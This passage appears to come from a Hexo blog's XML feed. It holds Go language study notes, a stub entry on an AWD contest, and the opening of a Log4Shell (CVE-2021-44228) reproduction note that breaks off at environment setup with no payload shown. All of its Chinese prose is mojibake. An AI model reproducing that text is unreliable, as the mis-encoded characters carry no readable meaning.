<span class="number">21</span> <span class="comment">// å®šä¹‰ä¸€ä¸ªå€¼ä¸º 21 çš„æ•°å€¼å¸¸é‡ &#x27;Age&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="å‡½æ•°"><a href="#å‡½æ•°" class="headerlink" title="å‡½æ•°"></a>å‡½æ•°</h3><p><code>Go</code> å‡½æ•°æ¥å—<code>é›¶ä¸ªæˆ–å¤šä¸ªå‚æ•°</code>ã€‚<strong>å‚æ•°å¿…é¡»æ˜ç¡®ç±»å‹åŒ–ï¼Œæ²¡æœ‰éšå¼å£°æ˜ç±»å‹ã€‚</strong></p><p><code>return</code>ä½¿ç”¨å…³é”®å­—ä»å‡½æ•°è¿”å›å€¼ã€‚</p><p>é€šè¿‡æŒ‡å®šå‡½æ•°åç§°å¹¶ä¸ºå‡½æ•°çš„æ¯ä¸ªå‚æ•°ä¼ é€’å‚æ•°æ¥è°ƒç”¨å‡½æ•°ã€‚</p><blockquote><p>è¯·æ³¨æ„ï¼ŒGo æ”¯æŒä¸¤ç§ç±»å‹çš„æ³¨é‡Šï¼š</p><p>å•è¡Œæ³¨é‡Šåœ¨å‰é¢ï¼Œå¤šè¡Œæ³¨é‡Šåœ¨å’Œ<code>//</code>ä¹‹é—´æ’å…¥ã€‚<code>/*``*/</code></p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> greeting</span><br><span class="line"></span><br><span class="line"><span class="comment">// Hello is a public function.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Hello</span> <span class="params">(name <span class="type">string</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> hi(name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// hi is a private function.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">hi</span> <span class="params">(name <span class="type">string</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hi &quot;</span> + name</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="å‡½æ•°å®šä¹‰"><a href="#å‡½æ•°å®šä¹‰" class="headerlink" title="*å‡½æ•°å®šä¹‰"></a>*å‡½æ•°å®šä¹‰</h4><blockquote><p><code>func å‡½æ•°å(å½¢å‚åˆ—è¡¨) è¿”å›ç±»å‹åˆ—è¡¨ &#123;</code><br>  <code>å‡½æ•°ä½“</code><br><code>&#125;</code></p><p>è¿™é‡Œçš„è¿”å›ç±»å‹åˆ—è¡¨æ˜¯å› ä¸º<code>è¿”å›å€¼éœ€è¦æè¿°è¿”å›å€¼ç±»å‹</code></p></blockquote><h4 id="å‡½æ•°è°ƒç”¨"><a href="#å‡½æ•°è°ƒç”¨" class="headerlink" title="å‡½æ•°è°ƒç”¨"></a>å‡½æ•°è°ƒç”¨</h4><blockquote><p>å‡½æ•°å¯ä»¥é€šè¿‡ <code>å‡½æ•°å(å®å‚åˆ—è¡¨)</code>ï¼Œåœ¨è°ƒç”¨è¿‡ç¨‹ä¸­å®å‚çš„æ¯ä¸ªæ•°æ®ä¼šèµ‹å€¼ç»™å½¢å‚ä¸­çš„å¯¹åº”å˜é‡ï¼ˆå®å‚åˆ—è¡¨ç±»å‹å’Œæ•°é‡éœ€è¦ä¸å½¢å‚ä¸€ä¸€å¯¹åº”ï¼‰</p><p>ã€è¿™å’Œå¤§éƒ¨åˆ†ä»£ç çš„è°ƒç”¨å‡½æ•°æ–¹æ³•ä¸€æ ·ï¼Œä¸ç”¨å¤šè¯´ã€‘</p></blockquote><h4 id="åŸºç¡€å‡½æ•°ç¤ºä¾‹"><a href="#åŸºç¡€å‡½æ•°ç¤ºä¾‹" class="headerlink" title="*åŸºç¡€å‡½æ•°ç¤ºä¾‹"></a>*åŸºç¡€å‡½æ•°ç¤ºä¾‹</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// æ— å‚å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">hello</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Hello World!&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æœ‰å‚å‡½æ•°ï¼Œname ç§°ä¸ºå½¢å‚</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">helloSomeone</span><span class="params">(name <span class="type">string</span>)</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Hello&quot;</span>, name, <span class="string">&quot;!&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æœ‰è¿”å›å€¼å‡½æ•°</span></span><br><span class="line"><span class="comment">//func add(a int, b int) int &#123;</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">add</span><span class="params">(a, b <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line"><span class="comment">//å‡½æ•°å£°æ˜ä¸­[a,b]å­˜åœ¨å¤šä¸ªç›¸åŒç±»å‹[int]çš„è¿ç»­å½¢å‚ï¼Œå¯ä»¥åªä¿ç•™æœ€åä¸€ä¸ªå½¢å‚çš„ç±»å‹[a, b int]</span></span><br><span class="line"><span class="keyword">return</span> a + b</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ExampleFunc</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// æ— å‚å‡½æ•°è°ƒç”¨</span></span><br><span class="line">hello()</span><br><span class="line"><span class="comment">// å‡½æ•°çš„æ ‡è¯†ç¬¦ä¸º func()ï¼Œè°ƒç”¨å‡½æ•°éœ€è¦åŠ  ()</span></span><br><span class="line">fmt.Printf(<span class="string">&quot;%T\n&quot;</span>, hello)</span><br><span class="line"></span><br><span class="line"><span class="comment">// æœ‰å‚å‡½æ•°è°ƒç”¨</span></span><br><span class="line">helloSomeone(<span class="string">&quot;xianbin&quot;</span>) <span class="comment">// name = &quot;xianbin&quot; ä¸ºå®å‚ï¼Œè°ƒç”¨å‡½æ•°æ—¶ï¼Œä¼ é€’ç»™å‡½æ•°çš„å½¢å‚</span></span><br><span class="line">fmt.Printf(<span class="string">&quot;%T\n&quot;</span>, helloSomeone)</span><br><span class="line"></span><br><span class="line"><span class="comment">// æœ‰è¿”å›å€¼å‡½æ•°è°ƒç”¨</span></span><br><span class="line">sum := add(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">fmt.Println(sum)</span><br><span class="line">fmt.Printf(<span class="string">&quot;%T\n&quot;</span>, add)</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°çš„ç±»å‹</span></span><br><span class="line"><span class="keyword">var</span> f <span class="function"><span class="keyword">func</span><span class="params">(<span class="type">int</span>, <span class="type">int</span>)</span></span> <span class="type">int</span></span><br><span class="line">    <span class="comment">//å‡½æ•°[func(int, int) int]ä¹Ÿå¯ä»¥èµ‹å€¼ç»™å˜é‡[var f]ï¼Œä¹Ÿå¯ä»¥å½“æˆå®å‚[f(1, 2)]èµ‹å€¼ç»™å¦ä¸€ä¸ªå‡½æ•°[fmt.Println()]ä½œä¸ºå½¢å‚ã€‚</span></span><br><span class="line">f = add</span><br><span class="line">fmt.Println(f(<span class="number">1</span>, <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// Output:</span></span><br><span class="line"><span class="comment">//Hello World!</span></span><br><span class="line"><span class="comment">//func()</span></span><br><span class="line"><span class="comment">//Hello xianbin !</span></span><br><span class="line"><span class="comment">//func(string)</span></span><br><span class="line"><span class="comment">//3</span></span><br><span class="line"><span class="comment">//func(int, int) int</span></span><br><span class="line"><span class="comment">//3</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Day2"><a href="#Day2" class="headerlink" title="Day2"></a>Day2</h1><h2 id="æ•°å­—"><a href="#æ•°å­—" class="headerlink" title="æ•°å­—"></a>æ•°å­—</h2><p>Go åŒ…å«åŸºæœ¬çš„æ•°å­—ç±»å‹ï¼Œå¯ä»¥è¡¨ç¤ºæ•´æ•°æˆ–æµ®ç‚¹å€¼çš„é›†åˆã€‚</p><p>è¿™ä¸ªæ¦‚å¿µå°†é›†ä¸­åœ¨ä¸¤ç§æ•°å­—ç±»å‹ä¸Šï¼š</p><blockquote><ul><li><code>int</code>ï¼šä¾‹å¦‚<code>0</code>ï¼Œï¼Œ<code>255</code>ã€‚<code>2147483647</code>å¤§å°è‡³å°‘ä¸º 32 ä½çš„å¸¦ç¬¦å·æ•´æ•°ï¼ˆå€¼èŒƒå›´ï¼š-2147483648 åˆ° 2147483647ï¼‰ã€‚ä½†è¿™å°†å–å†³äºç³»ç»Ÿæ¶æ„ã€‚å¤§å¤šæ•°ç°ä»£è®¡ç®—æœºéƒ½æ˜¯ 64 ä½çš„ï¼Œå› æ­¤<code>int</code>å¤§å°ä¸º 64 ä½ï¼ˆå–å€¼ç‡ä¸ºï¼š-9223372036854775808 åˆ° 9223372036854775807ï¼‰ã€‚</li><li><code>float64</code>ï¼šä¾‹å¦‚<code>0.0</code>ï¼Œ<code>3.14</code>ã€‚åŒ…å«æ‰€æœ‰ 64 ä½æµ®ç‚¹æ•°çš„é›†åˆã€‚</li></ul></blockquote><p><code>+</code>Go æ”¯æŒ, <code>-</code>, <code>*</code>,<code>/</code> å’Œ<code>%</code>ï¼ˆä½™æ•°ä¸å–æ¨¡ï¼‰çš„æ ‡å‡†ç®—æœ¯è¿ç®—ç¬¦é›†ã€‚</p><p>åœ¨ Go ä¸­ï¼Œä¸åŒç±»å‹ä¹‹é—´çš„èµ‹å€¼éœ€è¦æ˜¾å¼è½¬æ¢ã€‚ä¾‹å¦‚ï¼Œè¦å°† an <code>int</code> è½¬æ¢ä¸º a <code>float64</code>ï¼Œ</p><p>æ‚¨éœ€è¦æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š<code>an := float64(a)</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x <span class="type">int</span> = <span class="number">42</span></span><br><span class="line">f := <span class="type">float64</span>(x)</span><br><span class="line"></span><br><span class="line">fmt.Printf(<span class="string">&quot;x is of type: %s\n&quot;</span>, reflect.TypeOf(x))</span><br><span class="line"><span class="comment">// Output: x is of type: int</span></span><br><span class="line"></span><br><span class="line">fmt.Printf(<span class="string">&quot;f is of type: %s\n&quot;</span>, reflect.TypeOf(f))</span><br><span class="line"><span class="comment">// Output: f is of type: float64</span></span><br></pre></td></tr></table></figure><h3 id="è®¡ç®—"><a href="#è®¡ç®—" class="headerlink" title="è®¡ç®—"></a>è®¡ç®—</h3><p><code>Go</code>çš„è®¡ç®—ç¬¦ä½¿ç”¨ä»¥åŠè¿ç®—ç®€å†™å’Œå¤§éƒ¨åˆ†ä»£ç æ˜¯ä¸€æ ·</p><blockquote><p>å¯¹äºæ•´æ•°é™¤æ³•ï¼Œä½™æ•°è¢«ä¸¢å¼ƒï¼ˆä¾‹å¦‚<code>5 / 2 == 2</code>ï¼‰ï¼Œä¹Ÿæ˜¯ä¸€æ ·çš„</p><p>ç®€å†™ï¼Œå¦‚</p><p>a+&#x3D;5</p><p>a++</p><p>aâ€“</p></blockquote><h4 id="ä¸åŒç±»å‹çš„ç®—æœ¯è¿ç®—"><a href="#ä¸åŒç±»å‹çš„ç®—æœ¯è¿ç®—" class="headerlink" title="ä¸åŒç±»å‹çš„ç®—æœ¯è¿ç®—"></a>ä¸åŒç±»å‹çš„ç®—æœ¯è¿ç®—</h4><p>åœ¨è®¸å¤šè¯­è¨€ä¸­ï¼Œæ‚¨å¯ä»¥å¯¹ä¸åŒç±»å‹çš„å˜é‡æ‰§è¡Œç®—æœ¯è¿ç®—ï¼Œä½†åœ¨ Go ä¸­ï¼Œè¿™ä¼šäº§ç”Ÿé”™è¯¯ã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x <span class="type">int</span> = <span class="number">42</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// this line produces an error</span></span><br><span class="line">value := <span class="type">float32</span>(<span class="number">2.0</span>) * x <span class="comment">// invalid operation: mismatched types float32 and int</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// you must convert int type to float32 before performing arithmetic operation</span></span><br><span class="line">value := <span class="type">float32</span>(<span class="number">2.0</span>) * <span class="type">float32</span>(x)</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯ç”±äºè¿™æ ·é«˜ç²¾åº¦å’Œä½ç²¾åº¦è¿›è¡Œè®¡ç®—ï¼Œä¼šå¯¼è‡´ç²¾åº¦ä¸¢å¤±ï¼Œéœ€è¦å…ˆå°†ä½ç²¾åº¦ç±»å‹è½¬åŒ–ä¸ºé«˜ç²¾åº¦ç±»å‹ï¼Œå†è¿›è¡Œè®¡ç®—</p><h2 id="bool"><a href="#bool" class="headerlink" title="bool"></a>bool</h2><p>å’Œå¤§éƒ¨åˆ†ä»£ç ä¸€æ ·</p><p>Go ä¸­çš„å¸ƒå°”å€¼ç”±<code>bool</code>ç±»å‹è¡¨ç¤ºã€‚<code>bool</code>æ˜¯<code>true</code>æˆ–<code>false</code>ã€‚</p><p>Go æ”¯æŒä¸‰ç§å¸ƒå°”è¿ç®—ç¬¦ï¼š<code>!</code>(NOT)ã€<code>&amp;&amp;</code>(AND) å’Œ<code>||</code>(OR)ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">true</span> || <span class="literal">false</span> <span class="comment">// =&gt; true</span></span><br><span class="line"><span class="literal">true</span> &amp;&amp; <span class="literal">false</span> <span class="comment">// =&gt; false</span></span><br><span class="line">!<span class="literal">true</span> <span class="comment">// =&gt; false</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸‰ä¸ªå¸ƒå°”è¿ç®—ç¬¦å„æœ‰ä¸åŒçš„<em>è¿ç®—ç¬¦ä¼˜å…ˆçº§</em>ã€‚å› æ­¤ï¼Œå®ƒä»¬æŒ‰ä»¥ä¸‹é¡ºåºè¿›è¡Œè¯„ä¼°ï¼š<code>!</code>é¦–å…ˆã€<code>&amp;&amp;</code>ç¬¬äºŒå’Œæœ€å<code>||</code>ã€‚å¦‚æœæ‚¨æƒ³å¼ºåˆ¶æ‰§è¡Œä¸åŒçš„é¡ºåºï¼Œæ‚¨å¯ä»¥å°†å¸ƒå°”è¡¨è¾¾å¼æ‹¬åœ¨åœ†æ‹¬å·ä¸­ï¼ˆå³ã€‚<code>()</code>ï¼‰ï¼Œå› ä¸ºåœ†æ‹¬å·å…·æœ‰æ›´é«˜çš„è¿ç®—ç¬¦ä¼˜å…ˆçº§ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">!<span class="literal">true</span> &amp;&amp; <span class="literal">false</span>   <span class="comment">// =&gt; false</span></span><br><span class="line">!(<span class="literal">true</span> &amp;&amp; <span class="literal">false</span>) <span class="comment">// =&gt; true</span></span><br></pre></td></tr></table></figure><h3 id="ifæ¡ä»¶è¯­å¥ä¹¦å†™è§„èŒƒ"><a href="#ifæ¡ä»¶è¯­å¥ä¹¦å†™è§„èŒƒ" class="headerlink" title="ifæ¡ä»¶è¯­å¥ä¹¦å†™è§„èŒƒ"></a>ifæ¡ä»¶è¯­å¥ä¹¦å†™è§„èŒƒ</h3><p>å¦‚æœä¹ æƒ¯ç”¨</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(condition)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// do something</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// do something1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆåœ¨<code>Go</code>è¿™é‡Œå°±è¡Œä¸é€šäº†ï¼Œå¦‚æœä½ æŒ‰ä¸Šé¢çš„æ ¼å¼è¿›è¡Œä¹¦å†™ï¼Œå°±ä¼šæŠ¥é”™</p><blockquote><p><code>unexpected else</code></p></blockquote><p>ä½ éœ€è¦æŒ‰ç…§ä½œè€…è§„å®šçš„æ ¼å¼ï¼Œæ‰ä¼šä½¿å¾—ä»£ç ä¸æ˜¾ç¤ºé”™è¯¯</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> condition &#123;</span><br><span class="line">    <span class="comment">// do something</span></span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// do something1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>if+else if</code>ä¹Ÿæ˜¯å¦‚æ­¤</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> condition &#123;</span><br><span class="line">    <span class="comment">// do something</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> condition1 &#123;</span><br><span class="line">    <span class="comment">// do something1</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> condition2 &#123;</span><br><span class="line">    <span class="comment">// do something2</span></span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// do something3</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Go</code>çš„ä½œè€…è¿½æ±‚ç®€æ´ä¼˜é›…é«˜æ•ˆçš„ä»£ç æ ¼å¼ï¼Œæ‰€ä»¥é‡åˆ°è¿™ç§å½¢å¼ï¼Œåªèƒ½æŒ‰ä½œè€…çš„æ–¹å¼è¿›è¡Œç¼–å†™ï¼ˆæ— å¥ˆ</p><h1 id="Day3"><a href="#Day3" class="headerlink" title="Day3"></a>Day3</h1><h2 id="å…³äºå­—ç¬¦ä¸²"><a href="#å…³äºå­—ç¬¦ä¸²" class="headerlink" title="å…³äºå­—ç¬¦ä¸²"></a>å…³äºå­—ç¬¦ä¸²</h2><p>Go ä¸­çš„<code>string</code>æ˜¯ä¸€ä¸ª<code>ä¸å¯å˜çš„å­—èŠ‚åºåˆ—</code>ï¼Œ<code>ä¸ä¸€å®šä»£è¡¨å­—ç¬¦</code>ã€‚</p><p>åŒå¼•å·ä¹‹é—´å®šä¹‰äº†ä¸€ä¸ªå­—ç¬¦ä¸²æ–‡å­—ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> name = <span class="string">&quot;Jane&quot;</span></span><br></pre></td></tr></table></figure><p>å­—ç¬¦ä¸²å¯ä»¥é€šè¿‡<code>+</code>è¿ç®—ç¬¦è¿æ¥èµ·æ¥ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;Jane&quot;</span> + <span class="string">&quot; &quot;</span> + <span class="string">&quot;Austen&quot;</span></span><br><span class="line"><span class="comment">// =&gt; &quot;Jane Austen&quot;</span></span><br></pre></td></tr></table></figure><p>ä¸€äº›ç‰¹æ®Šå­—ç¬¦éœ€è¦ä½¿ç”¨å‰å¯¼åæ–œæ è¿›è¡Œè½¬ä¹‰ï¼Œä¾‹å¦‚<code>\t</code>åˆ¶è¡¨ç¬¦å’Œ<code>\n</code>å­—ç¬¦ä¸²ä¸­çš„æ–°è¡Œã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;How is the weather today?\nIt&#x27;s sunny&quot;</span>  </span><br><span class="line"><span class="comment">// =&gt;</span></span><br><span class="line"><span class="comment">// How is the weather today?</span></span><br><span class="line"><span class="comment">// It&#x27;s sunny</span></span><br></pre></td></tr></table></figure><p>è¯¥<code>strings</code>åŒ…åŒ…å«è®¸å¤šç”¨äºå¤„ç†å­—ç¬¦ä¸²çš„æœ‰ç”¨å‡½æ•°ã€‚æœ‰å…³å­—ç¬¦ä¸²å‡½æ•°çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹<a href="https://pkg.go.dev/strings">å­—ç¬¦ä¸²åŒ…æ–‡æ¡£</a>ã€‚è¿™é‡Œæœ‰äº›ä¾‹å­ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;strings&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// strings.ToLower returns the string given as argument with all its characters lowercased</span></span><br><span class="line">strings.ToLower(<span class="string">&quot;MaKEmeLoweRCase&quot;</span>)</span><br><span class="line"><span class="comment">// =&gt; &quot;makemelowercase&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// strings.Repeat returns a string with a substring given as argument repeated many times</span></span><br><span class="line">strings.Repeat(<span class="string">&quot;Go&quot;</span>, <span class="number">3</span>)</span><br><span class="line"><span class="comment">// =&gt; &quot;GoGoGo&quot;</span></span><br></pre></td></tr></table></figure><h2 id="å­—ç¬¦ä¸²åŒ…ï¼ˆstringsï¼‰"><a href="#å­—ç¬¦ä¸²åŒ…ï¼ˆstringsï¼‰" class="headerlink" title="å­—ç¬¦ä¸²åŒ…ï¼ˆstringsï¼‰"></a>å­—ç¬¦ä¸²åŒ…ï¼ˆstringsï¼‰</h2><h3 id="å…³äºå­—ç¬¦ä¸²åŒ…"><a href="#å…³äºå­—ç¬¦ä¸²åŒ…" class="headerlink" title="å…³äºå­—ç¬¦ä¸²åŒ…"></a>å…³äºå­—ç¬¦ä¸²åŒ…</h3><p>è¯¥<code>strings</code>åŒ…åŒ…å«è®¸å¤šç”¨äºå¤„ç†å­—ç¬¦ä¸²çš„æœ‰ç”¨å‡½æ•°ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;strings&quot;</span></span><br><span class="line"></span><br><span class="line">strings.ToUpper(<span class="string">&quot;test&quot;</span>) <span class="comment">// =&gt; &quot;TEST&quot;</span></span><br></pre></td></tr></table></figure><p>å’Œ<code>java</code>ä¸­çš„åŒ…å¾ˆç›¸ä¼¼</p><blockquote><p>è®°å‡ ä¸ªå¸¸ç”¨çš„</p><p><code>strings.Repeat(str,num)</code>ï¼šé‡å¤strå­—ç¬¦numæ¬¡</p><p><code>strings.TrimSpace(str)</code>ï¼šæ¸…é™¤<code>str</code>å­—ç¬¦ä¸²<code>å·¦å³</code>è¾¹çš„ç©ºæ ¼</p><p><code>strings.TrimLeft/TrimRight(str,sign)</code>ï¼šæ¸…é™¤<code>str</code>å­—ç¬¦ä¸²<code>å·¦/å³</code>è¾¹çš„signç¬¦å·</p></blockquote><h1 id="Day4"><a href="#Day4" class="headerlink" title="Day4"></a>Day4</h1>]]></content>
      
      
      <categories>
          
          <category> è¯­è¨€å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> goè¯­è¨€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AWDæ¯”èµ›è®°å½•</title>
      <link href="/2022/12/13/AWD/"/>
      <url>/2022/12/13/AWD/</url>
      
        <content type="html"><![CDATA[<p><strong><code>awdæ„Ÿè§‰æ—¶åˆ»å¤„äºåœ°ç‹±ï¼Œä¸€ä¸æ³¨æ„å°±è¢«æ‹¿åˆ†ï¼Œè¿˜è¢«cheakç‹ ç‹ çš„æ‰£åˆ†</code></strong></p><span id="more"></span><h1 id="2022å®‰æ´µæ¯å†³èµ›AWD"><a href="#2022å®‰æ´µæ¯å†³èµ›AWD" class="headerlink" title="2022å®‰æ´µæ¯å†³èµ›AWD"></a>2022å®‰æ´µæ¯å†³èµ›AWD</h1>]]></content>
      
      
      <categories>
          
          <category> ç½‘ç»œå®‰å…¨å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¯”èµ› </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVEæ¼æ´å­¦ä¹ </title>
      <link href="/2022/12/01/CVE-Test/"/>
      <url>/2022/12/01/CVE-Test/</url>
      
        <content type="html"><![CDATA[<p><strong><code>æƒ³æŠŠä¸€äº›å¸¸è§çš„CVEä»¥åŠä¸€äº›ç»å…¸æ¼æ´å¤ç°ï¼Œåšåšç¬”è®°</code></strong></p><span id="more"></span><h1 id="CVE-2021-44228"><a href="#CVE-2021-44228" class="headerlink" title="CVE-2021-44228"></a>CVE-2021-44228</h1><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Apache</span> Log4j2 æ˜¯ä¸€ä¸ªè¢«å¹¿æ³›ä½¿ç”¨çš„å¼€æºæ—¥å¿—è®°å½•åº“ï¼Œ<span class="number">2017</span> å¹´ <span class="number">7</span> æœˆæ—¶ï¼Œæœ‰äººå‘ Log4j2 æäº†æ”¯æŒ JNDI Lookup çš„éœ€æ±‚ï¼Œå¹¶ä» <span class="number">2</span>.<span class="number">0</span>-beta9 ä¹‹åå¼€å§‹æ”¯æŒï¼›ä»Šå¹´é˜¿é‡Œçš„å®‰å…¨ç ”ç©¶äººå‘˜å‘ç°è¯¥ç‰¹æ€§ä¼šå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œï¼Œäº <span class="number">2021</span> å¹´ <span class="number">11</span> æœˆ <span class="number">24</span> æ—¥å‘ Apache æŠ¥å‘Šäº†è¯¥æ¼æ´ï¼›<span class="number">12</span> æœˆ <span class="number">5</span> æ—¥å®˜æ–¹å‘å¸ƒäº†è¡¥ä¸ï¼›åˆ°äº† <span class="number">12</span> æœˆ <span class="number">9</span> æ—¥æ™šï¼ŒPoC çš„ä¼ æ’­èŒƒå›´å¼€å§‹å˜å¾—ä¸å¯æ§ï¼ŒåŸºæœ¬ä¸Šå„å¤§å‚å•†éƒ½å—å½±å“ï¼Œå½±å“èŒƒå›´å¾ˆå¹¿ï¼Œäºæ˜¯äººä»¬ç»™å®ƒèµ·äº†ä¸ªåå­—â€”â€”Log4Shellã€‚</span><br></pre></td></tr></table></figure><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ç¯å¢ƒæ­å»ºè™šæ‹Ÿæœºç‰ˆæœ¬</span><span class="punctuation">:</span> <span class="string">ubuntu 20.4</span></span><br><span class="line"><span class="attribute">Apache 